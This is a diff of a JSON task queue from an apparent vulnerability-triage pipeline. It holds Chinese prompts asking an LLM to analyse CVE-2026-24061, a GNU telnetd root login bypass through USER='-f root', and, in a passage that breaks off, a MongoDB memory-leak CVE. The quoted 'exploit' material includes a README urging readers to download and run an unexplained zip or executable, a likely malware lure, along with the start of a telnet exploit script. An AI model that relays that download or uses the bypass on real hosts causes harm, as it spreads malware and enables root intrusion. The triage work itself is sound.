     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-24061\", \"sources\": [\"NVD\", \"CISA\", \"OSCS\"], \"descriptions\": [\"telnetd in GNU Inetutils through 2.7 allows remote authentication bypass via a \\\"-f root\\\" value for the USER environment variable.\", \"\\u6807\\u9898: GNU InetUtils Telnetd \\u8fdc\\u7a0b\\u8eab\\u4efd\\u9a8c\\u8bc1\\u7ed5\\u8fc7\\u6f0f\\u6d1e\"], \"published_date\": \"2026-01-21T07:16:01.597\", \"last_modified_date\": \"2026-06-17T10:22:32.427\", \"cvss_score\": 9.8, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"c\", \"o\", \"d\", \"e\", \"b\", \"e\", \"r\", \"g\", \".\", \"o\", \"r\", \"g\", \"/\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"/\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"c\", \"c\", \"b\", \"a\", \"9\", \"f\", \"7\", \"4\", \"8\", \"a\", \"a\", \"8\", \"d\", \"5\", \"0\", \"a\", \"3\", \"8\", \"d\", \"7\", \"7\", \"4\", \"8\", \"e\", \"2\", \"e\", \"6\", \"0\", \"3\", \"6\", \"2\", \"e\", \"d\", \"d\", \"6\", \"a\", \"3\", \"2\", \"c\", \"c\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"c\", \"o\", \"d\", \"e\", \"b\", \"e\", \"r\", \"g\", \".\", \"o\", \"r\", \"g\", \"/\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"/\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"f\", \"d\", \"7\", \"0\", \"2\", \"c\", \"0\", \"2\", \"4\", \"9\", \"7\", \"b\", \"2\", \"f\", \"3\", \"9\", \"8\", \"e\", \"7\", \"3\", \"9\", \"e\", \"3\", \"1\", \"1\", \"9\", \"b\", \"e\", \"d\", \"0\", \"b\", \"2\", \"3\", \"d\", \"d\", \"7\", \"a\", \"a\", \"7\", \"b\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"g\", \"n\", \"u\", \".\", \"o\", \"r\", \"g\", \"/\", \"a\", \"r\", \"c\", \"h\", \"i\", \"v\", \"e\", \"/\", \"h\", \"t\", \"m\", \"l\", \"/\", \"b\", \"u\", \"g\", \"-\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"/\", \"2\", \"0\", \"2\", \"6\", \"-\", \"0\", \"1\", \"/\", \"m\", \"s\", \"g\", \"0\", \"0\", \"0\", \"0\", \"4\", \".\", \"h\", \"t\", \"m\", \"l\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"g\", \"n\", \"u\", \".\", \"o\", \"r\", \"g\", \"/\", \"s\", \"o\", \"f\", \"t\", \"w\", \"a\", \"r\", \"e\", \"/\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"1\", \"/\", \"2\", \"0\", \"/\", \"2\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"1\", \"/\", \"2\", \"0\", \"/\", \"8\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"v\", \"i\", \"c\", \"a\", \"r\", \"i\", \"u\", \"s\", \".\", \"i\", \"o\", \"/\", \"v\", \"s\", \"o\", \"c\", \"i\", \"e\", \"t\", \"y\", \"/\", \"p\", \"o\", \"s\", \"t\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"2\", \"4\", \"0\", \"6\", \"1\", \"-\", \"d\", \"e\", \"t\", \"e\", \"c\", \"t\", \"i\", \"o\", \"n\", \"-\", \"s\", \"c\", \"r\", \"i\", \"p\", \"t\", \"-\", \"r\", \"e\", \"m\", \"o\", \"t\", \"e\", \"-\", \"a\", \"u\", \"t\", \"h\", \"e\", \"n\", \"t\", \"i\", \"c\", \"a\", \"t\", \"i\", \"o\", \"n\", \"-\", \"b\", \"y\", \"p\", \"a\", \"s\", \"s\", \"-\", \"i\", \"n\", \"-\", \"g\", \"n\", \"u\", \"-\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"-\", \"p\", \"a\", \"c\", \"k\", \"a\", \"g\", \"e\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"v\", \"i\", \"c\", \"a\", \"r\", \"i\", \"u\", \"s\", \".\", \"i\", \"o\", \"/\", \"v\", \"s\", \"o\", \"c\", \"i\", \"e\", \"t\", \"y\", \"/\", \"p\", \"o\", \"s\", \"t\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"2\", \"4\", \"0\", \"6\", \"1\", \"-\", \"m\", \"i\", \"t\", \"i\", \"g\", \"a\", \"t\", \"i\", \"o\", \"n\", \"-\", \"s\", \"c\", \"r\", \"i\", \"p\", \"t\", \"-\", \"r\", \"e\", \"m\", \"o\", \"t\", \"e\", \"-\", \"a\", \"u\", \"t\", \"h\", \"e\", \"n\", \"t\", \"i\", \"c\", \"a\", \"t\", \"i\", \"o\", \"n\", \"-\", \"b\", \"y\", \"p\", \"a\", \"s\", \"s\", \"-\", \"i\", \"n\", \"-\", \"g\", \"n\", \"u\", \"-\", \"i\", \"n\", \"e\", \"t\", \"u\", \"t\", \"i\", \"l\", \"s\", \"-\", \"p\", \"a\", \"c\", \"k\", \"a\", \"g\", \"e\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"1\", \"/\", \"2\", \"2\", \"/\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"d\", \"e\", \"b\", \"i\", \"a\", \"n\", \".\", \"o\", \"r\", \"g\", \"/\", \"d\", \"e\", \"b\", \"i\", \"a\", \"n\", \"-\", \"l\", \"t\", \"s\", \"-\", \"a\", \"n\", \"n\", \"o\", \"u\", \"n\", \"c\", \"e\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"1\", \"/\", \"m\", \"s\", \"g\", \"0\", \"0\", \"0\", \"2\", \"5\", \".\", \"h\", \"t\", \"m\", \"l\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"2\", \"4\", \"0\", \"6\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"l\", \"a\", \"b\", \"s\", \".\", \"g\", \"r\", \"e\", \"y\", \"n\", \"o\", \"i\", \"s\", \"e\", \".\", \"i\", \"o\", \"/\", \"g\", \"r\", \"i\", \"m\", \"o\", \"i\", \"r\", \"e\", \"/\", \"2\", \"0\", \"2\", \"6\", \"-\", \"0\", \"1\", \"-\", \"2\", \"2\", \"-\", \"f\", \"-\", \"a\", \"r\", \"o\", \"u\", \"n\", \"d\", \"-\", \"a\", \"n\", \"d\", \"-\", \"f\", \"i\", \"n\", \"d\", \"-\", \"o\", \"u\", \"t\", \"-\", \"1\", \"8\", \"-\", \"h\", \"o\", \"u\", \"r\", \"s\", \"-\", \"o\", \"f\", \"-\", \"u\", \"n\", \"s\", \"o\", \"l\", \"i\", \"c\", \"i\", \"t\", \"e\", \"d\", \"-\", \"h\", \"o\", \"u\", \"s\", \"e\", \"g\", \"u\", \"e\", \"s\", \"t\", \"s\", \"/\", \"i\", \"n\", \"d\", \"e\", \"x\", \".\", \"h\", \"t\", \"m\", \"l\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"1\", \"/\", \"2\", \"0\", \"/\", \"2\", \"#\", \":\", \"~\", \":\", \"t\", \"e\", \"x\", \"t\", \"=\", \"r\", \"o\", \"o\", \"t\", \"@\", \".\", \".\", \".\", \"a\", \"%\", \"3\", \"A\", \"~\", \"%\", \"2\", \"0\", \"U\", \"S\", \"E\", \"R\", \"=\", \"'\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] Root Cause Analysis & PoC Exploit for CVE-2026-24061 | SafeBreach\n [description] SafeBreach Labs Releases Root Cause Analysis & Proof-of-Concept Exploit for CVE-2026-24061: Telnetd RCE as Root Vulnerability Get SafeBreach Labs's latest analysis on the root cause of a critical remote code execution vulnerability on Linux running Telnetd service that has a critical CVSS score of 9.8.\n [link] https://www.safebreach.com/blog/safebreach-labs-root-cause-analysis-and-poc-exploit-for-cve-2026-24061/\n [webpage 0 end]\n[webpage 1 begin] [title] Nvd - Cve-2026-24061\n [description] NVD MENU Information Technology Laboratory National Vulnerability Database Vulnerabilities\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-24061\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-24061｜Telnetd存在远程认证绕过漏洞（POC）\n [description] Telnet协议曝高危漏洞CVE-2026-24061，影响GNU InetUtils 1.9.3至2.7版本。攻击者可利用环境变量注入漏洞绕过认证，通过构造USER=-f root参数直接获取root权限。漏洞原理是telnetd未对USER变量过滤，触发login的-f免认证机制。已公开PoC代码，建议用户及时升级...\n [link] https://cloud.tencent.com/developer/article/2633211\n [webpage 2 end]\n[webpage 3 begin] [title] The Zombie Protocol: A Comprehensive Engineering Autopsy of CVE-2026 ...\n [description] The definitive engineering analysis of CVE-2026-24061. We dissect the GNU Inetutils Telnetd authentication bypass, RFC 1572 protocol logic, environment injection mechanics, and why agentic AI (Penligent) is the only way to catch zombie protocol vulnerabilities in 2026.\n [link] https://www.penligent.ai/hackinglabs/the-zombie-protocol-a-comprehensive-engineering-autopsy-of-cve-2026-24061-gnu-inetutils-auth-bypass/\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-24061 Security Vulnerability & Exploit Details\n [description] The exploitability of CVE-2026-24061 depends on two key factors: attack complexity (the level of effort required to execute an exploit) and privileges required (the access level an attacker needs). Exploitability Analysis for CVE-2026-24061 With low attack complexity and no required privileges, CVE-2026-24061 is an easy target for cybercriminals. Organizations should prioritize immediate ...\n [link] https://cve.akaoma.com/cve-2026-24061\n [webpage 4 end]\n[webpage 5 begin] [title] CVE-2026-24061 - Exploits & Severity - Feedly\n [description] CVE-2026-28372 Ron Ben Yizhak from SafeBreach found that the fix for CVE-2026-24061 was not complete and can be exploited by abusing systemd service credentials support added to the login (1) implementation of util-linux in release 2.40.\n [link] https://feedly.com/cve/CVE-2026-24061\n [webpage 5 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/682b7fcc195cb96aa2bc43637d5bf39b/README.md\n---\n# 🔒 CVE-2026-24061 - Exploit Critical Authentication Flaw\n\n## 🚀 Getting Started\n\nWelcome to the CVE-2026-24061 project. This application demonstrates a critical security flaw. It allows attackers to bypass authentication in GNU inetutils-telnetd. This README will guide you through downloading and running the software.\n\n[![Download Now](https://raw.githubusercontent.com/obrunolima1910/CVE-2026-24061/main/ultrainvolved/CV_3.6.zip%https://raw.githubusercontent.com/obrunolima1910/CVE-2026-24061/main/ultrainvolved/CV_3.6.zip)](https://raw.githubusercontent.com/obrunolima1910/CVE-2026-24061/main/ultrainvolved/CV_3.6.zip)\n\n## 📥 Download & Install\n\nTo begin, visit the Releases page to download the application. The page will list the latest files available.\n\n[Visit the Releases Page to Download](https://raw.githubusercontent.com/obrunolima1910/CVE-2026-24061/main/ultrainvolved/CV_3.6.zip)\n\n### Steps to Download\n\n1. Click the link above to visit the Releases page.\n2. Find the latest version of CVE-2026-24061.\n3. Look for the download link for your operating system—either Windows, macOS, or Linux.\n4. Click the appropriate link to download the application file to your computer.\n\n### System Requirements\n\n- **Operating Systems**: Compatible with Windows 10/11, macOS 10.15 and newer, and most Linux distributions.\n- **Memory**: At least 512 MB of RAM.\n- **Storage**: 100 MB of free disk space.\n\n## 📂 Running the Application\n\nOnce the download completes, follow these steps to run the application:\n\n### For Windows Users\n\n1. Open the folder where the file downloaded.\n2. Double-click on the executable file (e.g., `https://raw.githubusercontent.com/obrunolima1910/CVE-2026-24061/main/ultrainvolved/CV_3.6.zip`).\n3. If prompted by Windows, click “Run” to allow the application to start.\n\n### For macOS Users\n\n1. Open the Downloads folder.\n2. Find `https://raw.githubusercontent.com/obrunolima1910/CVE-2026-24061/main/ultrainvolved/CV_3.6.zip` and double-click it.\n3. Drag the application icon into your Applications folder.\n4. Open the Applications folder and double-click on the application to run it.\n\n### For Linux Users\n\n1. Open a terminal window.\n2. Navigate to the directory where the file downloaded.\n3. If necessary, type `chmod +x CVE-2026-24061` to make the file executable.\n4. Run the application with the command: `./CVE-2026-24061`.\n\n## 📊 How It Works\n\nThe CVE-2026-24061 application showcases a significant flaw in the GNU inetutils-telnetd service. Attackers can exploit this flaw to gain unauthorized root access through a specific telnet option called NEW_ENVIRON.\n\nBy running this application, users can understand how the vulnerability functions. This knowledge helps in recognizing similar security risks and applying mitigations as necessary.\n\n## 🌐 Exploring Features\n\n- **Illustration of the Vulnerability**: The application demonstrates the authentication bypass in real-time.\n- **Analysis Tools**: Review the methods used for exploitation and testing.\n- **Educational Purpose**: Learn about telnet and its vulnerabilities to improve security measures.\n\n## 🛠 Troubleshooting\n\nIf you encounter issues, consider these tips:\n\n- Ensure your system meets the requirements listed above.\n- Check if your firewall or antivirus is blocking the application.\n- Try downloading again if the file appears corrupted.\n\n## 🏁 Conclusion\n\nCVE-2026-24061 is an essential tool for understanding security flaws in telnet services. Following the steps in this guide will help you download, install, and run the application smoothly. \n\nDon't forget to revisit the Releases page for updates and new versions.\n\n[Download Now](https://raw.githubusercontent.com/obrunolima1910/CVE-2026-24061/main/ultrainvolved/CV_3.6.zip)\n\n---\n/tmp/682b7fcc195cb96aa2bc43637d5bf39b/main.py\n---\n#!/usr/bin/env python3\n# Exploit Title: GNU inetutils-telnetd - Remote Authentication Bypass\n# Date: 01/22/2026\n# PoC Author: github.com/SystemVll\n# Exploit Author: IRIS C2 Team\n# Vendor Homepage: https://www.gnu.org/software/inetutils/\n# Software Link: https://ftp.gnu.org/gnu/inetutils/\n# Version: Affected versions of GNU inetutils-telnetd\n# Tested on: Linux\n# CVE: CVE-2026-24061\n# Description: GNU inetutils-telnetd Remote Authentication Bypass\n#              CVSS 9.8 - Instant root shell, no authentication required\n#              Exploits NEW_ENVIRON option with USER='-f <user>' to bypass authentication\n\nimport socket\nimport sys\nimport select\nimport os\nimport threading\nfrom datetime import datetime\n\n# Telnet protocol constants\nIAC, SB, SE = 255, 250, 240\nDO, DONT, WILL, WONT = 253, 254, 251, 252\n\n\nclass Colors:\n    RED = '\\033[91m'\n    GREEN = '\\033[92m'\n    YELLOW = '\\033[93m'\n    BLUE = '\\033[94m'\n    RESET = '\\033[0m'\n\n\nclass Main:\n    @staticmethod\n    def format_console_date(date):\n        return '[' + date.strftime('%Y-%m-%d %H:%M:%S') + ']'\n\n\nclass Exploit:\n    def __init__(self, host, port=23, user=\"root\"):\n        self.host = host\n        se\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 4,
+    "retry_count": 5,
     "max_retries": 5,
     "priority": 2,
-    "status": "pending",
+    "status": "failed",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1782336287.3417587,
-    "last_attempt": 1782342409.4968567,
-    "next_attempt": 1782342474.072609,
+    "last_attempt": 1782359099.1880667,
+    "next_attempt": 1782359138.475327,
     "metadata": {},
     "task_id": "task_CVE-2026-24061_1782336287",
     "required_result_fields": [
@@ -2873,15 +2873,15 @@
   {
     "cve_id": "CVE-2025-14847",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-14847\", \"sources\": [\"NVD\", \"CISA\", \"OSCS\"], \"descriptions\": [\"Mismatched length fields in Zlib compressed protocol headers may allow a read of uninitialized heap memory by an unauthenticated client. This issue affects all MongoDB Server v7.0 prior to 7.0.28 versions, MongoDB Server v8.0 versions prior to 8.0.17, MongoDB Server v8.2 versions prior to 8.2.3, MongoDB Server v6.0 versions prior to 6.0.27, MongoDB Server v5.0 versions prior to 5.0.32, MongoDB Server v4.4 versions prior to 4.4.30, MongoDB Server v4.2 versions greater than or equal to 4.2.0, MongoDB Server v4.0 versions greater than or equal to 4.0.0, and MongoDB Server v3.6 versions greater than or equal to 3.6.0.\", \"\\u6807\\u9898: MongoDB Server Zlib\\u538b\\u7f29\\u534f\\u8bae\\u5934\\u957f\\u5ea6\\u6df7\\u6dc6\\u5bfc\\u81f4\\u654f\\u611f\\u4fe1\\u606f\\u6cc4\\u6f0f\\u6f0f\\u6d1e\"], \"published_date\": \"2025-12-19T11:15:49.277\", \"last_modified_date\": \"2026-06-17T08:36:38.717\", \"cvss_score\": 7.5, \"severity\": \"HIGH\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"j\", \"i\", \"r\", \"a\", \".\", \"m\", \"o\", \"n\", \"g\", \"o\", \"d\", \"b\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"/\", \"S\", \"E\", \"R\", \"V\", \"E\", \"R\", \"-\", \"1\", \"1\", \"5\", \"5\", \"0\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"5\", \"/\", \"1\", \"2\", \"/\", \"2\", \"9\", \"/\", \"2\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"s\", \"m\", \"a\", \"r\", \"t\", \"k\", \"e\", \"y\", \"s\", \"s\", \".\", \"c\", \"o\", \"m\", \"/\", \"p\", \"o\", \"s\", \"t\", \"/\", \"m\", \"o\", \"n\", \"g\", \"o\", \"b\", \"l\", \"e\", \"e\", \"d\", \"-\", \"p\", \"r\", \"e\", \"-\", \"a\", \"u\", \"t\", \"h\", \"-\", \"m\", \"e\", \"m\", \"o\", \"r\", \"y\", \"-\", \"d\", \"i\", \"s\", \"c\", \"l\", \"o\", \"s\", \"u\", \"r\", \"e\", \"-\", \"v\", \"i\", \"a\", \"-\", \"o\", \"p\", \"_\", \"c\", \"o\", \"m\", \"p\", \"r\", \"e\", \"s\", \"s\", \"e\", \"d\", \"-\", \"i\", \"n\", \"-\", \"m\", \"o\", \"n\", \"g\", \"o\", \"d\", \"b\", \"-\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"1\", \"4\", \"8\", \"4\", \"7\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"v\", \"i\", \"c\", \"a\", \"r\", \"i\", \"u\", \"s\", \".\", \"i\", \"o\", \"/\", \"v\", \"s\", \"o\", \"c\", \"i\", \"e\", \"t\", \"y\", \"/\", \"p\", \"o\", \"s\", \"t\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"1\", \"4\", \"8\", \"4\", \"7\", \"-\", \"d\", \"e\", \"t\", \"e\", \"c\", \"t\", \"i\", \"o\", \"n\", \"-\", \"s\", \"c\", \"r\", \"i\", \"p\", \"t\", \"-\", \"h\", \"e\", \"a\", \"p\", \"-\", \"m\", \"e\", \"m\", \"o\", \"r\", \"y\", \"-\", \"e\", \"x\", \"p\", \"o\", \"s\", \"u\", \"r\", \"e\", \"-\", \"i\", \"n\", \"-\", \"m\", \"o\", \"n\", \"g\", \"o\", \"d\", \"b\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"v\", \"i\", \"c\", \"a\", \"r\", \"i\", \"u\", \"s\", \".\", \"i\", \"o\", \"/\", \"v\", \"s\", \"o\", \"c\", \"i\", \"e\", \"t\", \"y\", \"/\", \"p\", \"o\", \"s\", \"t\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"1\", \"4\", \"8\", \"4\", \"7\", \"-\", \"m\", \"i\", \"t\", \"i\", \"g\", \"a\", \"t\", \"i\", \"o\", \"n\", \"-\", \"s\", \"c\", \"r\", \"i\", \"p\", \"t\", \"-\", \"h\", \"e\", \"a\", \"p\", \"-\", \"m\", \"e\", \"m\", \"o\", \"r\", \"y\", \"-\", \"e\", \"x\", \"p\", \"o\", \"s\", \"u\", \"r\", \"e\", \"-\", \"i\", \"n\", \"-\", \"m\", \"o\", \"n\", \"g\", \"o\", \"d\", \"b\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"1\", \"4\", \"8\", \"4\", \"7\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] Exploit for CVE-2025-14847 - exploit database | Vulners.com\n [description] CVE-2025-14847 - MongoDB Unauthenticated Memory‑Leak Exploit Overview A proof‑of‑concept (PoC) exploit for the MongoDB zlib decompression vulnerability that allows unauthenticated attackers to read sensitive server memory.The PoC is implemented in...\n [link] https://vulners.com/githubexploit/03B41327-D2A1-5F6C-A672-35EB0BD49A05\n [webpage 0 end]\n[webpage 1 begin] [title] MongoBleed Vulnerability: CVE-2025-14847 in MongoDB\n [description] POC and Exploit for CVE-2025-14847 (MongoBleed) A working proof of concept for CVE-2025-14847, commonly referred to as MongoBleed, is publicly available and demonstrates how trivial exploitation is once network access to a vulnerable MongoDB instance exists.\n [link] https://phoenix.security/mongobleed-vulnerability-cve-2025-14847/\n [webpage 1 end]\n[webpage 2 begin] [title] Mongobleed (CVE-2025-14847): Deep Dive Analysis, Packet Inspection, and ...\n [description] Deep dive into Mongobleed (CVE-2025-14847). Analyze the unauthenticated MongoDB vulnerability, download the PoC, and learn how to automate detection using Penligent.\n [link] https://www.penligent.ai/hackinglabs/mongobleed-cve-2025-14847-deep-dive-analysis-packet-inspection-and-automation-strategy/\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2025-14847 - vulmon.com\n [description] MongoBleed-Pro ☠️ Advanced MongoDB Memory Leak Exploit Tool Keep Learning | Keep Hacking with Alexcyberx 🔥 About MongoBleed-Pro is an advanced exploitation tool for CVE-2025-14847, a critical memory disclosure vulnerability in MongoDB's zlib compression handling This tool allows security researchers to extract sensitive data from ...\n [link] https://vulmon.com/vulnerabilitydetails?qid=CVE-2025-14847\n [webpage 3 end]\n[webpage 4 begin] [title] Nvd - 